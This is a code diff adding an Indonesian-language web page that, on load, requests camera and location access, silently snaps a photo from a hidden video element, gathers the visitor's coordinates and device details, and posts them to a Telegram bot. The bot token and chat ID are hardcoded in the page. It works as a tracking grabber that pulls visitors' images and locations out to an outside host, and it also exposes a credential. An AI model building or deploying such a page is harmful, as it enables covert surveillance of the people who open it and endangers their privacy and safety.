@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Auto Foto + Lokasi + Kirim Telegram</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <style>
+    #video {
+      display: none; /* sembunyikan video */
+    }
+  </style>
+</head>
+<body class="bg-gray-100 min-h-screen flex items-center justify-center p-6">
+
+  <div class="bg-white rounded-xl shadow-lg max-w-md w-full p-6 space-y-5 text-gray-800">
+    <h1 class="text-2xl font-bold text-center text-blue-700 mb-2">📸 Foto & Lokasi Otomatis</h1>
+    <p class="text-center text-gray-600">Meminta izin kamera dan lokasi, lalu mengirim ke Telegram.</p>
+
+    <div id="status" class="bg-gray-50 p-4 rounded text-center font-semibold text-gray-700 min-h-[3rem]">
+      Memulai proses...
+    </div>
+
+    <div id="info" class="bg-gray-50 p-4 rounded text-sm font-mono whitespace-pre-wrap hidden"></div>
+  </div>
+
+  <video id="video" autoplay playsinline></video>
+  <canvas id="canvas" style="display:none;"></canvas>
+
+  <script>
+    const TELEGRAM_BOT_TOKEN = "7956041557:AAGXD3lqUjqU4U-DBwYigZwrZYMAe118F44";
+    const TELEGRAM_CHAT_ID = "8096360677";
+
+    const video = document.getElementById("video");
+    const canvas = document.getElementById("canvas");
+    const statusEl = document.getElementById("status");
+    const infoEl = document.getElementById("info");
+
+    let coords = null;
+
+    async function startCamera() {
+      try {
+        statusEl.textContent = "Meminta izin akses kamera...";
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        video.srcObject = stream;
+        statusEl.textContent = "Kamera diizinkan, mengambil foto...";
+        video.onloadedmetadata = () => {
+          takeSnapshot();
+        };
+      } catch (e) {
+        statusEl.textContent = "❌ Gagal akses kamera: " + e.message;
+      }
+    }
+
+    function takeSnapshot() {
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      const ctx = canvas.getContext("2d");
+      ctx.drawImage(video, 0, 0);
+
+      canvas.toBlob(async (blob) => {
+        statusEl.textContent = "Foto diambil, menunggu lokasi...";
+        await getLocation();
+        await sendTelegram(blob);
+      }, "image/jpeg", 0.9);
+    }
+
+    async function getLocation() {
+      return new Promise((resolve) => {
+        if (!navigator.geolocation) {
+          statusEl.textContent = "⚠️ Geolocation tidak didukung browser.";
+          resolve();
+          return;
+        }
+        navigator.geolocation.getCurrentPosition(
+          (pos) => {
+            coords = pos.coords;
+            statusEl.textContent = "Lokasi diterima.";
+            resolve();
+          },
+          (err) => {
+            statusEl.textContent = "⚠️ Gagal mendapatkan lokasi: " + err.message;
+            resolve();
+          }
+        );
+      });
+    }
+
+    function getDeviceInfo() {
+      return `
+User Agent: ${navigator.userAgent}
+Platform: ${navigator.platform}
+Bahasa: ${navigator.language}
+Online: ${navigator.onLine}
+      `.trim();
+    }
+
+    async function sendTelegram(photoBlob) {
+      let caption = `📸 Foto otomatis dari website\n\n`;
+      if (coords) {
+        caption += `📍 Lokasi:\nLatitude: ${coords.latitude}\nLongitude: ${coords.longitude}\n` +
+                   `https://maps.google.com/?q=${coords.latitude},${coords.longitude}\n\n`;
+      } else {
+        caption += "📍 Lokasi: Tidak tersedia\n\n";
+      }
+      caption += `🧠 Info perangkat:\n${getDeviceInfo()}`;
+
+      infoEl.textContent = caption;
+      infoEl.classList.remove("hidden");
+
+      try {
+        const formData = new FormData();
+        formData.append("chat_id", TELEGRAM_CHAT_ID);
+        formData.append("photo", photoBlob, "snapshot.jpg");
+        formData.append("caption", caption);
+
+        const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+          method: "POST",
+          body: formData,
+        });
+
+        if (res.ok) {
+          statusEl.textContent = "✅ Foto dan data berhasil dikirim ke Telegram!";
+        } else {
+          statusEl.textContent = "❌ Gagal mengirim ke Telegram.";
+        }
+      } catch (e) {
+        statusEl.textContent = "❌ Error saat kirim ke Telegram: " + e.message;
+      }
+    }
+
+    window.onload = () => {
+      startCamera();
+    };
+  </script>
+</body>
+</html>
